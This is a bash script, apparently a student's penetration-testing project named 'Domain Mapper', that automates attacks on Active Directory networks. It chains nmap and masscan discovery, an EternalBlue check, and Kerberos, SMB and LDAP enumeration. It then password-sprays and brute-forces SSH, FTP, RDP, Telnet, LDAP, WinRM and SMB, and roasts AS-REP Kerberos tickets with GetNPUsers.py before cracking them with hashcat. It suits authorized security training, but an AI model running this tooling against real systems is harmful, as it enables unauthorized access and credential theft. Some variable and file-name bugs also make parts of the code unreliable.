#!/bin/bash

#student name: daniel ben-yehuda
#student code: S7
#class code: 773626
#lecturer name: erel

# this script utilize the GetNPUsers.py as a standalone script and i have no claims for its IP.
# originating from https://github.com/fortra/impacket


#global
DG=$(route -n | awk 'NR==3 {print $2}') #default gateway for exclusion
FCIP=$(ifconfig | grep -w inet | awk 'NR==1 {print $2}') # Operator's IP for exclusion
tool=$(pwd)
casesum="casesum.txt"
#color code
red='\e[0;31m'
grn='\e[0;32m'
norm='\e[0;0m'
yel='\e[0;33m'
cyan='\e[0;36m'



function banner () { #script banner with timestamp
    echo -e "${grn}"
    figlet "Project: Domain Mapper"
    echo -e "A vulnerability scan tool by Daniel ben-yehuda ${norm}"
    date
    sleep 2
}
banner




function usercheck () {
    echo -e "${grn} Verifying Super-user... ${norm}" #somme of the functions require sudo prevililages, this act's as a "due diligence" so it doesnt block the user down the line, also running this as sudo from the get go will prevent the script from stopping mid way to ask for the password. 
    if [ "$(whoami)" != "root" ]; then
        echo -e "${red}This script requires superuser privileges. Please run with sudo.${norm}"
        exit 1
    else
	    echo -e "${grn} Super-user confirmed, loading script.... ${norm}"
    fi
}
usercheck

function clone() { #find if the wordlist is in the tool directory, if not how to approach it (extract, download, ignor)

    if [ -f "$tool/rockyou.txt" ]; then
        echo -e "${grn}File rockyou.txt exists.${norm}"
    else
        echo -e "${red}File rockyou.txt does not exist.${norm}"
        echo -e "This script utilizes the wordlist rockyou.txt as default.\n[1] Press 1 to extract it from the default \"Kali Linux\" path to the script's directory.\n[2] Press 2 to clone it from GitHub.\n[3] Press enter to continue and select another list later."
        read -p ":: " rockyou
        sleep 2

        case $rockyou in
            1)
                gzip -d /usr/share/wordlists/rockyou.txt.gz -c > "$tool/rockyou.txt"
                ;;
            2)
                git clone https://github.com/zacheller/rockyou.git "$tool/rockyou-repo"
                ;;
            3)
                echo -e "${red}Skipping wordlist${norm}"
                ;;
        esac
    fi
}

clone


function Get() { # Get clone for impacket-master (dependency tool)
    if [ -d "$tool/Additional_Tools/impacket-master" ]; then
        echo -e "${grn}Impacket-master is valid${norm}"
    else
        echo -e "${yel}Downloading dependency tool impacket${norm}"
        git clone https://github.com/fortra/impacket.git "$(pwd)/Additional_Tools/impacket-master"
    fi
}




function output_select () { #select path for output "mother" directory, a summery, host list and user list files will be in it + each host found will have it's own directory with more detailed actions inside it.
        echo "Output directory slection"
        echo "Please set output directory by full path or press [ENTER] for current working directory" 
        read -p " :: " dir
    if [ -z "$dir" ]; then #if the user presses "enter" make a defaultive output directory in the PWD.
        mkdir output
        echo "$(pwd)/output selected as output directory"
    else
        mkdir $dir
        echo -e "${yel} $dir Created and set as output directory ${norm}"
        echo 
    fi
        figlet "Project: Domain Mapper" >> $dir/$casesum # setting up the summery file with the banner and timestamp.
        echo -e "A vulnerability scan tool by Daniel ben-yehuda ${norm}" >> $dir/$casesum
        date >> $dir/$casesum
}
output_select

function level_select () { #select basic, intermediate or advanced
    echo ""
    echo -e "${yel} please select a working method - note that the higher the mode is it will encompasses all the lower options ${norm}"
    echo "-----------------------------------------------------------------------------------------------------------"
    echo -e "[1] :: BASIC: Open ports and Services identification, DC identification DHCP identification, vulnerability scan. \n"
    echo -e "[2] :: INTERMEDIATE: Basic +  FTP, SSH, SMB, WinRM, LDAP, RDP Enumeration & Shared Folders Enumeration.\n" 
    echo -e "[3] :: ADVANCED: Intermediate + Extract all Users/Groups/Shares, Display password policy, find disabled accounts & never expire accounts, domain admins by name.\n"
    exec < /dev/tty 
    read -p ":: " mode_case
    echo "-----------------------------------------------------------------------------------------------------------"
    
}
level_select

function ad_credentials () { # choose valid credentials - pre-deliverd or extracted via OSINT\social engineering to use for enumeration on the DC. 
    echo -e "${yel}[-]Please enter AD username to use[-]"
    read -p ":: " ADuser
    echo -e "${yel}[-]Please enter AD password to use[-]"
    read -p ":: " ADpass
}


function credentials_define () { # this command is used specificly for the password-spay function, the reason is that during enumeration the operator might want to choose aditional users found that wern't knowen to him previously.
                                 # in adition, it will only show up if the relevant levels selected.
    echo -e "${yel}STARTING DOMAIN WIDE PASSWORD-SPRAY -> Please insert Active Directory user names OR Path to users list${norm}"
    echo -e "${red}! it is recommanded to use a manual USER LIST or load a premade short one if since it is intended for PASSWORD SPRAY rather than BRUTE FORCE!${norm} however given the need you can just load any list of your choosing"
    exec < /dev/tty
    read -p ":: " ADU


if [ "$mode_case" == 2 ] || [ "$mode_case" == 3 ]; then #check if the input is an existing file, if not it means its a manual list and turn it in to a file. or an empty string in that case use default rockyou.
    if [ -z "$ADU" ]; then
        ADU="$tool/topusers.txt"
        cat "$ADU" | wc -l
        echo "USER NAMES LOADED FROM THE LIST $ADU"
        echo -e "--------------------------\nDEFAULT USER LIST SELECTED  :: $ADU\n--------------------------" >> $dir/$casesum
    elif [ -f "$ADU" ]; then
        cat "$ADU" | wc -l
        echo "USER NAMES LOADED FROM THE LIST $ADU"
        echo -e "--------------------------\nUSER LIST SELECTED  :: $ADU\n--------------------------" >> $dir/$casesum
    else 
        echo "$ADU" | tr ' ' '\n' > "$dir/custom_users.lst"
        ADU="$dir/custom_users.lst"
        echo "$(cat $dir/custom_users.lst | wc -l) USERS LOADED INTO THE USER LIST $ADU"
         echo -e "--------------------------\nUSERS SELECTED (MANUAL)\n$ADU\n-------------------------- $(cat $ADU)" >> $dir/$casesum
    fi

    echo "Please insert passwords, Path to passwords list or [ENTER] for default list (rockyou.txt) to attempt brute force / password spray"
    read -p ":: " ADP

    if [ -z "$ADP" ]; then
        ADP="$tool/rockyou.txt"
        cat "$ADP" | wc -l
        echo "PASSWORDS LOADED FROM THE LIST $ADP"
        echo -e "--------------------------\nDEFAULT PASSWORD LIST SELECTED :: $ADP\n--------------------------" >> $dir/$casesum
    elif [ -f "$ADP" ]; then
        cat "$ADP" | wc -l
        echo "PASSWORDS LOADED FROM THE LIST $ADP"
        echo -e "--------------------------\nPASSWORD LIST SELECTED  :: $ADP\n--------------------------" >> $dir/$casesum
    else 
        echo "$ADP" | tr ' ' '\n' > "$dir/custom_pass.lst"
        ADP="$dir/custom_pass.lst"
        echo "$(cat $dir/custom_pass.lst | wc -l) PASSWORDS LOADED INTO THE USER LIST $ADP"
        echo -e "--------------------------\nPASSWORDS SELECTED (MANUAL)\n$ADP\n--------------------------$(cat $ADP)" >> $dir/$casesum
    fi
fi
    echo -e "-----------------------------------------------------------------------------------------------------------\n"
}


function module_scan () {
        echo "Please provide target network"
        read -p ":: " target
        echo -e  "${yel} it is better to exclude default gateway, scanning client etc.. please provide exclusions if needed \n default gateway :: $DG \n your IP :: $FCIP" 
        echo -e "Exclusion :: ${norm}" ; read exclusion #filter out IP's manualy
        echo -e "---------------------------------\nNETWORK:: $target \n EXCLUSIONS :: $exclusion\n ---------------------------------" >> $dir/$casesum
        echo -e "Perfoming hosts detection scan..."
        nmap --exclude $FCIP,$DG,$exclusion $target -F -Pn  | grep "scan report" | awk '{print $NF}' | sed 's/(//g' | sed 's/)//g' >> $dir/NetHosts.txt #host descovery scan + removal of the user's machine, default gateway and any other host the user wish to exclude manualy. also scannes only 100 ports and is used to generaly see what adresses are UP.
        cat $dir/NetHosts.txt >> $dir/$casesum #writes discovered hosts in to the summery file, seperators and exclusions.
        echo -e "${cyan}-----------------------------------------------------------------------------------------------------------\nHOSTS DETECTED ->\n$(cat $dir/NetHosts.txt) ${norm}"
    for host in $(cat $dir/NetHosts.txt); do mkdir $dir/$host; done #creat results directory for each IP found

    if [ $mode_case == 1 ]; then #basic scan only
    figlet "BASIC" >> $dir/$casesum
    echo "Performing basic port scan, OS detection and service versions"
        for IP in $(cat $dir/NetHosts.txt); do  echo -e "\n $IP general details \n -------------------------  \n" >> $dir/$casesum  #preparing seperator for each IP in the summery file
            echo "[-]Scanning for OS on $IP[-]"
                nmap $IP -O | grep -e "OS CPE" -e "OS details" -e "Network Distance" -e "Running:" -e "Device type:" -e "Nmap scan" >> $dir/$casesum  #target OS info and general info.
            echo "[-]Performing TCP port scan on $IP[-]"
                nmap $IP -Pn -T5 >> $dir/$IP/tcp.txt   # defailt 1000 port scan with "up-check" skip.
            echo "[-]Scanning TCP service versions on $IP[-]"
                nmap $IP -Pn -sV -p $(cat $dir/$IP/tcp.txt | grep "/tcp" | awk -F'/' '{print $1}' | tr '\n' ',') -T5 >> $dir/$IP/tcpservice.txt #scan each and only open ports for their services as part of the exploitation part of the basic mode.
            echo -e "\n \n **** PORT & SERVICES REPORT **** \n \n" >> $dir/$casesum  #spacer and title for versions and services to follow.
            cat $dir/$IP/tcpservice.txt | grep -e "PORT" -e "open" -e "filtered" >> $dir/$casesum #print the TCP info after the spacer
        done
    fi
    

    if [ $mode_case == 2 ] || [ $mode_case == 3 ]; then
    figlet "INTERMEDIATE" >> $dir/$casesum
        for IP in $(cat $dir/NetHosts.txt); do  echo -e "\n $IP general details \n -------------------------  \n" >> $dir/$casesum 
            echo "[-]scanning for OS on $IP[-]"
                nmap $IP -O | grep -e "OS CPE" -e "OS details" -e "Network Distance" -e "Running:" -e "Device type:" -e "Nmap scan" >> $dir/$casesum 
            echo "[-]Performing full TCP port scan on $IP[-]"
                nmap $IP -Pn -p- -T5 > $dir/$IP/tcp.txt   #same as the basic option but with the adition of "-p-" for complete TCP scan
            echo "[-]scanning TCP service versions on $IP[-]"
                nmap $IP -Pn -sV -p $(cat $dir/$IP/tcp.txt | grep "/tcp" | awk -F'/' '{print $1}' | tr '\n' ',') -T5 > $dir/$IP/tcpservice.txt         
            echo -e "\n \n **** PORT & SERVICES REPORT **** \n \n" >> $dir/$casesum 
            cat $dir/$IP/tcpservice.txt | grep -e "PORT" -e "open" -e "filtered" >> $dir/$casesum 
    done 
    fi
    
    if [ $mode_case == 3 ]; then
    figlet "ADVANCED" >> $dir/$casesum
        for IP in $(cat $dir/NetHosts.txt); do
            echo "[-]full UPD and service scan on $IP[-]"
                masscan $IP -pU:1-65535 --rate=10000 --banners >> $dir/$IP/udpservice.txt #this scan covers the advanced mode and scans all ports in UDP and grabbs the banners.
            cat $dir/$IP/udpservice.txt | grep -e "PORT" -e "open" -e "filtered" >> $dir/$casesum #print the UDP info after the spacer
    done #here ends the loops that depend on the mode user input continues to enother general scan to determine the value of the domain name, either by direct user input or a simple SMB scan.
        fi

        echo -e "\n -------------------------DHCP DETECTED ->\n -------------------------" >> $dir/$casesum ; nmap -script /usr/share/nmap/scripts/broadcast-dhcp-discover.nse >> $dir/$casesum
        echo -e "${cyan}DHCP DETECTED -> \n -------------------------" ; cat $dir/$casesum | grep "Server Identifier:"; echo -e "\n -------------------------${norm}"
    

        echo -e "${yel}[-] Please define the Domain Name and the Active Directory Credentials, if you have missing information about the target follow the instractions of eaach information piece [+] ${norm}"
        echo "Please insert Domain Name or press [ENTER] to enumerate"
        read -p ":: " DN
    if [ -z "$DN" ]; then
        echo -e "---------------------------------\nHOSTS DOMAIN AFFILIATION\n---------------------------------" >> $dir/$casesum
        crackmapexec smb $target >> $dir/domains.txt # if the operator didnt input domain name enumerate the host by sending SMB nagotiation packet and extract the domain name from the session setup. this loops on all adresses and will find all domains on the CIDR ( i dont know why would anyone design the network in such way, but if it will it will find it)
        echo -e "---------------------------------\nHOSTS DOMAIN AFFILIATION\n---------------------------------"
        echo -e "${cyan}"; cat $dir/domains.txt | grep SMB | awk '{print "DOMAIN NAME::"$2,$(NF-2)}' | sort | uniq ; cat $dir/domains.txt | grep SMB | awk '{print "DOMAIN NAME::"$(NF-2)}' >> $dir/$casesum; echo -e "${norm}"
    else
        echo "$DN" >> $dir/domains.txt # determin user input as the domain name
        echo -e "---------------------------------\nTARGETIN DOMAIN :: $DN\n---------------------------------" >> $dir/$casesum
    fi
}



function module_enumerate () { #the function holds all 3 mods that are triggered by user input - basic=1, intermediate=12, advanced=123.

        echo -e "${yel}[-]STARTING BASIC ENUMERATION MODULE[-]${norm}"
        echo -e "-----------------------------------------------------------------------------------------------------------\n"
        echo -e "${yel}HOST DETECTION SYSTEM -> THE HIGHER THE SCORE THE MORE LIKELY IT IS THE DOMAIN CONTROLLER! ${norm}"
        echo -e "---------------------------------\nDC GRADING\n---------------------------------"
    for host in $(cat "$dir/NetHosts.txt"); do #this bit determin the DC by checking for services that are very likely to be hosted on a DC, the higher the more likely it is the DC.
            
            grade=0  # Initialize grade for each host

        if grep -q "ldap" "$dir/$host/tcpservice.txt"; then
                (( grade++ ))
        fi

        if grep -q "kerberos" "$dir/$host/tcpservice.txt"; then
                (( grade++ ))
        fi

        if grep -q "domain" "$dir/$host/tcpservice.txt"; then
                (( grade++ ))
        fi

        
        echo -e "$host GRADE:: $grade $( cat $dir/domains.txt | grep "$host" | awk '{print "DOMAIN::",$(NF-2)}' | sed 's/(domain://g' | sed 's/)//g')" >> "$dir/domains.txt"

    done
        echo -e "${cyan}"; cat $dir/domains.txt | grep GRADE | awk '{print "DOMAIN CONTROLLER DETECTED -> indicating services::",$NF,"| IP ->",$1}' | sort -n | tail -1; echo -e "${norm}"
        cat $dir/domains.txt | grep GRADE | awk '{print "DOMAIN CONTROLLER DETECTED -> indicating services::",$NF,"| IP ->",$1}' | sort -n | tail -1 >> $dir/$casesum
        
    


    if [ "$mode_case" == 2 ] || [ "$mode_case" == 3 ]; then
                echo -e "${yel}[-]STARTING INTERMEDIATE ENUMERATION MODULE[-]${norm}"
                echo -e "-----------------------------------------------------------------------------------------------------------\n"
        for host in $(cat $dir/NetHosts.txt); do
            echo -e "---------------------------------\nKEY SERVICES FOR HOST  :: $host\n---------------------------------" >> "$dir/$casesum"
            cat "$dir/$host/tcpservice.txt" | grep -e ftp -e ssh -e "netbios-ssn" -e HTTPAPI -e ldap -e rdp -e "microsoft-ds" | awk '{print $3,"SERVICE FOUND ON PORT::",$1}' >> "$dir/$casesum" #grabbing the key services from the previously done scan, orginizing them in the summery file and presenting only existing ones per adress for the operator.
            echo -e "${norm}---------------------------------\nKEY SERVICES FOR HOST  :: $host ->\n---------------------------------${cyan}" 
            cat "$dir/$host/tcpservice.txt" | grep -e ftp -e ssh -e "netbios-ssn" -e HTTPAPI -e ldap -e rdp -e "microsoft-ds" | sed 's/netbios-ssn/SMB/g' | sed 's/HTTPAPI/WinRM/g' | sed 's/microsoft-ds/SMB/g' | awk '{print $3,"SERVICE FOUND ON PORT::",$1}'
            echo -e "${norm}"

            echo -e "scanning  $host for ETERNALBLUE vulnerability ->" #3 NSE scripts as requirement for 3.2.3. this one in specific i chose due to its severness and stealthyness, no farther actions will be taken with this vulnerability since it isnt in the project scope.
            if sudo nmap --script /usr/share/nmap/scripts/smb-vuln-ms17-010.nse $host | grep  -e  'State: VULNERABLE'; then
                echo -e "${red}! HOST $host IS  VULNERABEL TO ETERNALBLUE! ${norm}" 
            fi
            echo -e "scanning  $host for KERBEROS users ->"
            for port in $(cat $dir/$host/tcpservice.txt | grep -e "kerberos" | awk -F'/' '{print $1}' | tr '\n' ',' ); do
                nmap --script krb5-enum-users --script-args "krb5-enum-users.realm=$(cat $dir/domains.txt | grep $host | awk -F'domain:' '{print $2}' | awk -F')' '{print $1}')" $host >> $dir/$host/KERBEROS_USERS.txt
                echo -e "${cyan}"
                if cat $dir/$host/KERBEROS_USERS.txt | grep "|" | wc -l ; then echo -e "${norm}:: KERBEROS USERS ::"; else echo -e "No KERBEROS users enumerated"; fi
            done    
            echo -e "scanning  $host for HTTP folders ->"
            for port in $(cat $dir/$host/tcpservice.txt | grep "open" | grep -e "http" | awk -F'/' '{print $1}' | tr '\n' ',' ); do
                nmap -sV --script http-enum -p $port $host >> $dir/$host/HTTP_FOLDERS.txt
                echo -e "${cyan}"
                if cat $dir/$host/HTTP_FOLDERS.txt| grep "|" | grep -v "http-enum:" | grep -v "http-server-header:" | wc -l ; then echo -e "${norm}:: HTTP FOLDERS ::"; else echo -e "No HTTP folders enumerated$"; fi
            done

            echo -e "scanning  $host for SMB shares ->" #enumerate shares as requirement for 3.2.2
            for port in $(cat $dir/$host/tcpservice.txt | grep -e "ldap" -e "microsoft-ds" -e "netbios-ssn" | awk -F'/' '{print $1}' | tr '\n' ',' ); do
                nmap --script smb-enum-shares.nse -p $port $host >> $dir/$host/SMB_SHARES.txt
                echo -e "${cyan}"
                if cat $dir/$host/SMB_SHARES.txt | grep "$host" | wc -l; then echo -e "${norm}:: SMB SHARES ::"; else echo -e "No SMB shares enumerated"; fi
                
            done

                
           
        done
    fi

if [ "$mode_case" == 3 ]; then #some of these enumerations relate to the same things as the intermediate enumeration, however, they differ buy utilizing valid credentials and getting all entries rathen than defaultive and common ones.
    credentials=$(cat "$dir/$controller/enum_advanced_admin.txt" | grep "+" | head -1 | awk '{print $6, $7}' | sed 's/\\/\//g' | awk '{print $1}')

    echo -e "${yel}[-]STARTING ADVANCED ENUMERATION MODULE[-]${norm}"
    echo -e "-----------------------------------------------------------------------------------------------------------\n"

    for controller in $(cat "$dir/$casesum" | grep "DOMAIN CONTROLLER DETECTED" | awk '{print $NF}'); do
        echo -e "[-]Enumerating $controller for users list[-]"
        crackmapexec smb "$controller" -u "$ADuser" -p "$ADpass" --users >> "$dir/$controller/enum_advanced_users.txt"
        echo -e "${cyan}$(grep 'badpwdcount' "$dir/$controller/enum_advanced_users.txt" | wc -l) DOMAIN USERS FOUND${norm}"

        echo -e "[-]Enumerating $controller for groups list[-]"
        crackmapexec smb "$controller" -u "$ADuser" -p "$ADpass" --groups >> "$dir/$controller/enum_advanced_groups.txt"
        group_count=$(grep -v "membercount: 0" "$dir/$controller/enum_advanced_groups.txt" | wc -l)
        echo -e "${cyan}$group_count GROUPS FOUND, OF WHICH $group_count ARE EMPTY${norm}"

        echo -e "[-]Enumerating $controller for domain admin accounts[-]"
        crackmapexec smb "$controller" -u "$ADuser" -p "$ADpass" --groups 'Domain Admins' >> "$dir/$controller/enum_advanced_admin.txt"
        admin_count=$(cat $dir/$controller/enum_advanced_admin.txt | grep -v + | grep -v '*' | wc -l )
        echo -e "${cyan}$admin_count ADMIN ACCOUNTS FOUND -> \n $(cat $dir/$controller/enum_advanced_admin.txt| grep -v '+' | grep -v '*'| awk -F'\' '{print $2}') ${norm}"

        echo -e "[-]Enumerating $controller for shared folders[-]"
        crackmapexec smb "$controller" -u "$ADuser" -p "$ADpass" --shares >> "$dir/$controller/enum_advanced_shares.txt"
        share_count=$(grep -v "+" "$dir/$controller/enum_advanced_shares.txt" | awk '{print $5}' | tail -n +4 | wc -l)
        echo -e "${cyan}$share_count SHARE FOLDERS FOUND${norm}"

        echo -e "[-]Enumerating $controller for password policy[-]"
        crackmapexec smb "$controller" -u "$ADuser" -p "$ADpass" --pass-pol >> "$dir/$controller/enum_advanced_pass-pol.txt"
        password_policy=$(tail -n +4 "$dir/$controller/enum_advanced_pass-pol.txt" | awk '{print $5,$6,$7,$8,$9,$10}')
        echo -e "${cyan}PASSWORD POLICY ->\n-------------------------------------------\n $password_policy ${norm}"

        echo -e "[-]Enumerating $controller for user characteristics[-]"
        crackmapexec winrm "$controller" -u "$ADuser" -p "$ADpass" -x 'Powershell; Get-ADUser -Filter * -Properties PasswordNeverExpires' | grep -E "Name|Enabled|PasswordNeverExpires" > "$dir/$controller/enabled_expired_users.txt"
        never_expire_count=$(grep "PasswordNeverExpires : True" "$dir/$controller/enabled_expired_users.txt" | wc -l)
        disabled_count=$(grep "Enabled              : False" "$dir/$controller/enabled_expired_users.txt" | wc -l)
        echo -e "${cyan}$never_expire_count NEVER-EXPIRE USERS FOUND, & $disabled_count DISABLED USERS ${norm}"

    done
fi
}


function module_exploit() {
    #the basic functionality, applies to all so no need to declare "if [ "$mode_case" == 1 ]"
    echo -e "${yel}[+]STARTING BASIC EXPLOITATION MODULE[+] ${norm}"
    echo -e "-----------------------------------------------------------------------------------------------------------\n"
    
    for host in $(cat "$dir/NetHosts.txt"); do #for each adress scan open ports by grebbing them from the previouse scan and grabbing banners only for them (saves time and noise)
        echo -e "scanning $host for service vulnerabilities"
        echo -e "------------------------------------------------------\nBASIC VULNERABILITY SCAN FOR HOST :: $host ->\n------------------------------------------------------" >> "$dir/$casesum"
        nmap -Pn -sV --script=/usr/share/nmap/scripts/vulners.nse -p $(cat "$dir/$host/tcpservice.txt" | grep open | awk -F'/' '{print $1}' | tr '\n' ',') "$host" >> "$dir/$host/vuln_scan.txt"
        
        vulnerabilities=$(grep CVE "$dir/$host/vuln_scan.txt" | wc -l) #orgenize findings in the summery file
        echo -e "${cyan}$vulnerabilities vulnerabilities found on the host :: $host\n detailed results are in the dedicated '$dir/$host/vuln_scan.txt' file${norm}"
        echo -e "--------------------------------------\n$host Vulners.nse SCRIPT REPORT\n--------------------------------------\n" >> "$dir/$casesum"
        echo -e "$vulnerabilities FULL VULNERABILITIES IDENTIFICATION ->\n " >> "$dir/$casesum"
        cat $dir/$host/vuln_scan.txt | grep -e "CVE" -e "SSV" >> $dir/$casesum
    done

    if [ "$mode_case" == 2 ] || [ "$mode_case" == 3 ]; then #for each key service found in the host full tcp file, attempt to password spray with the selected users and passwords, the operator is given the choise to redefine them from what the DC enumeration was.
        echo -e "${yel}[-]STARTING INTERMEDIATE EXPLOITATION MODULE[-]${norm}"
        echo -e "-----------------------------------------------------------------------------------------------------------\n"
        credentials_define
        
        for host in $(cat "$dir/NetHosts.txt"); do
            echo -e "testing weak credentials on host :: $host"

            if grep -qw "ssh" "$dir/$host/tcpservice.txt"; then
                echo -e "\n**** VERIFIED SSH WEAK PASS CHECK ****" >> "$dir/$casesum"
                echo -e "[+] testing SSH service [+]"
                for port in $(grep ssh "$dir/$host/tcpservice.txt" | awk -F'/' '{print $1}'); do
                    medusa -h "$host" -U "$ADU" -P "$ADP" -M ssh >> "$dir/$host/ssh-brute-results.txt"
                done
                if [ -f "$dir/$host/ssh-brute-results.txt" ]; then
                    grep "SUCCESS" "$dir/$host/ssh-brute-results.txt" >> "$dir/$casesum"
                    echo -e "${cyan}" && grep "SUCCESS" "$dir/$host/ssh-brute-results.txt"
                    echo -e "${norm}"
                fi
            fi

            if grep -qw "ftp" "$dir/$host/tcpservice.txt"; then
                echo -e "\n**** VERIFIED FTP WEAK PASS CHECK ****" >> "$dir/$casesum"
                echo -e "[+] testing ftp service [+]"
                for port in $(grep ftp "$dir/$host/tcpservice.txt" | awk -F'/' '{print $1}'); do
                    medusa -h "$host" -U "$ADU" -P "$ADP" -M ftp >> "$dir/$host/ftp-brute-results.txt"
                done
                if [ -f "$dir/$host/ftp-brute-results.txt" ]; then
                    grep "SUCCESS" "$dir/$host/ftp-brute-results.txt" >> "$dir/$casesum"
                    echo -e "${cyan}$(cat $dir/$host/ftp-brute-results.txt|  grep "SUCCESS" | head -1)${norm}" #may need fix
                fi
            fi

            if grep -qw "rdp" "$dir/$host/tcpservice.txt"; then
                echo -e "\n**** VERIFIED RDP WEAK PASS CHECK ****" >> "$dir/$casesum"
                echo -e "[+] testing rdp service [+]"
                for port in $(grep rdp "$dir/$host/tcpservice.txt" | awk -F'/' '{print $1}'); do
                    medusa -h "$host" -U "$ADU" -P "$ADP" -M rdp >> "$dir/$host/rdp-brute-results.txt"
                done
                if [ -f "$dir/$host/rdp-brute-results.txt" ]; then
                    grep "SUCCESS" "$dir/$host/rdp-brute-results.txt" >> "$dir/$casesum"
                    echo -e "${cyan}" && grep "SUCCESS" "$dir/$host/rdp-brute-results.txt"
                    echo -e "${norm}"
                fi
            fi

            if grep -qw "telnet" "$dir/$host/tcpservice.txt"; then
                echo -e "\n**** VERIFIED TELNET WEAK PASS CHECK ****" >> "$dir/$casesum"
                echo -e "[+] testing for TELNET users weak password [+]"
                for port in $(grep telnet "$dir/$host/tcpservice.txt" | awk -F'/' '{print $1}'); do
                    nmap "$host" -p "$port" --script telnet-brute --script-args userdb="$ADU",passdb="$ADP" >> "$dir/$host/telnet-brute-results.txt"
                done
                if [ -f "$dir/$host/telnet-brute-results.txt" ]; then
                    grep "Valid" "$dir/$host/telnet-brute-results.txt" >> "$dir/$casesum"
                    echo -e "${cyan}" && grep "Valid" "$dir/$host/telnet-brute-results.txt"
                    echo -e "${norm}"
                fi
            fi

            echo -e "-----------------------------\nKEY SERVICES ENUMERATION\n-----------------------------\n" >> $dir/$casesum
            if grep -qw "ldap" "$dir/$host/tcpservice.txt"; then
                echo -e "\n**** VERIFIED LDAP WEAK PASS CHECK ****" >> "$dir/$casesum"
                echo -e "[+] testing for LDAP users weak password [+]"
                for port in $(grep ldap "$dir/$host/tcpservice.txt" | awk -F'/' '{print $1}'); do
                    hydra -L "$ADU" -P "$ADP" ldap3://"$host:$port" >> "$dir/$host/ldap-brute-results.txt"
                    cat $dir/$host/ldap-brute-results.txt >> $dir/$casesum
                done
                if [ -f "$dir/$host/ldap-brute-results.txt" ]; then
                    grep "host" "$dir/$host/ldap-brute-results.txt" >> "$dir/$casesum"
                    echo -e "${cyan}" && grep "password:" "$dir/$host/ldap-brute-results.txt"
                    echo -e "${norm}"
                fi
            fi

            if grep -qw "HTTPAPI" "$dir/$host/tcpservice.txt"; then
                echo -e "\n**** VERIFIED WINRM WEAK PASS CHECK ****" >> "$dir/$casesum"
                echo -e "[+] testing for WINRM users weak password [+]"
                for port in $(grep HTTPAPI "$dir/$host/tcpservice.txt" | awk -F'/' '{print $1}'); do
                    crackmapexec winrm "$host" -u "$ADU" -p "$ADP" >> "$dir/$host/winrm-brute-results.txt"
                done
                if [ -f "$dir/$host/winrm-brute-results.txt" ]; then
                    grep "+" "$dir/$host/winrm-brute-results.txt" >> "$dir/$casesum"
                    echo -e "${cyan}" && grep "+" "$dir/$host/winrm-brute-results.txt"
                    echo -e "${norm}"
                fi
            fi
        
    
            if grep -qw "microsoft-ds" "$dir/$host/tcpservice.txt"; then
                echo -e "\n**** VERIFIED SMB WEAK PASS CHECK ****" >> "$dir/$casesum"
                echo -e "[+] testing for SMB users weak password [+]"
                for port in $(grep 'microsoft-ds' "$dir/$host/tcpservice.txt" | awk -F'/' '{print $1}'); do
                    crackmapexec smb "$host" -u "$ADU" -p "$ADP" >> "$dir/$host/SMB-brute-results.txt"
                done
                if [ -f "$dir/$host/smb-brute-results.txt" ]; then
                    grep "+" "$dir/$host/smb-brute-results.txt" >> "$dir/$casesum"
                    echo -e "${cyan}" && grep "+" "$dir/$host/smb-brute-results.txt"
                    echo -e "${norm}"
                fi
            fi
        done
    fi

    if [ "$mode_case" == 3 ]; then
        echo -e "${yel}[-]STARTING ADVANCED EXPLOITATION MODULE[-]${norm}"
        echo -e "-----------------------------------------------------------------------------------------------------------\n"
        
        controller=$(grep "DOMAIN CONTROLLER DETECTED" "$dir/$casesum" | awk '{print $NF}')
        address=$(grep "DOMAIN CONTROLLER" "$dir/$casesum" | awk '{print $NF}')
        credentials=$(grep "+" "$dir/$controller/enum_advanced_admin.txt" | head -1 | awk '{print $6, $7}' | sed 's/\\/\//g' | awk '{print $1}')
        

        python3 $(locate impacket | grep GetNPUsers.py) "$credentials" -request -dc-ip "$controller" > "$dir/kerberos_tickets.txt" #greb kerberos tickets from pre-auth users 
        echo -e "-----------------------------------------------------------------------------------------------------------\n KERBEROS TICKETS FOUND\n-----------------------------------------------------------------------------------------------------------\n"
        cat $dir/kerberos_tickets.txt >> $dir/$casesum
        echo -e "${cyan}[-] $(grep CN "$dir/kerberos_tickets.txt" | wc -l) tickets found for Domain Controller [-]\n $(cat $dir/kerberos_tickets.txt| grep "CN") ${norm}"
        echo -e "${yel}The script will now initiate an offline brute-force attack on the found tickets, note that if you used a specific known list so far it is better to switch to the DEFAULT rockyou.txt or other brute-force oriented list .\n press [ENTER] to use the previous password list or enter a new path${norm}"
        read -p "BRUTE LIST :: " BFL #let the operator choose what wordlist he wants to password spray with - press [ENTR] for rockyou

        if [ -z "$BFL" ]; then
            BFL="$tool/rockyou.txt"
            echo "PASSWORDS LOADED FROM THE LIST $BFL"
            echo -e "--------------------------\nDEFAULT PASSWORDS SELECTED FOR PASSWORD-SPRAY-> $BFL\n--------------------------" >> "$dir/$casesum"
        elif [ -f "$BFL" ]; then
            echo "PASSWORDS LOADED FROM THE LIST $BFL"
            echo -e "--------------------------\nPASSWORD LIST SELECTED FOR PASSWORD-SPRAY -> $BFL\n--------------------------" >> "$dir/$casesum"
        else
            echo -e "PATH INVALID -> RESORTING TO DEFAULT"
            BFL="$tool/rockyou.txt"
        fi
        #crack the hashes with straight attack method
        hashcat -a 0 "$dir/kerberos_tickets.txt" "$BFL" | grep -i 'netsec.local' | awk -F':' '{print $1,"CRACKED -> "$NF}' | awk -F'$' '{print "USER ",$4}' >> "$dir/kerberos_tickets.txt"
        echo -e "${cyan}--------------------------\n TICKETS CRACKED -> \n-------------------------- \n $(cat $dir/kerberos_tickets.txt | grep USER) ${norm}"
        echo -e "-----------------------------------------------------------------------------------------------------------\n KERBEROS TICKETS CRACKED\n-----------------------------------------------------------------------------------------------------------\n" >> $dir/$casesum
        cat $dir/kerberos_tickets.txt | grep USER >> $dir/$casesum
    fi
}

function summery () { #this function summerize all important findings in quantity for the operator to get a general impression of the findings.
        vulnerabilities=$(cat $dir/*/vuln_scan.txt | grep -i "cve" | wc -l ) #define what is a vulnerability

        echo -e "${grn}"; figlet "OVERview" >> "$dir/$casesum"
        echo -e "YOU SCANNED :: $(cat $dir/NetHosts.txt | wc -l) :: TARGETS AT $target" >> "$dir/$casesum"
        echo -e "FOR A TOTAL OF :: $(cat $dir/$casesum | grep open | wc -l) :: OPEN PORTS & $(cat $dir/$casesum | grep filtered | wc -l) Filtered PORTS" >> "$dir/$casesum"
        echo -e "DISCOVERED A TOTAL OF :: $vulnerabilities :: VULNERABILITIES IN THE NETWORK" >> "$dir/$casesum"
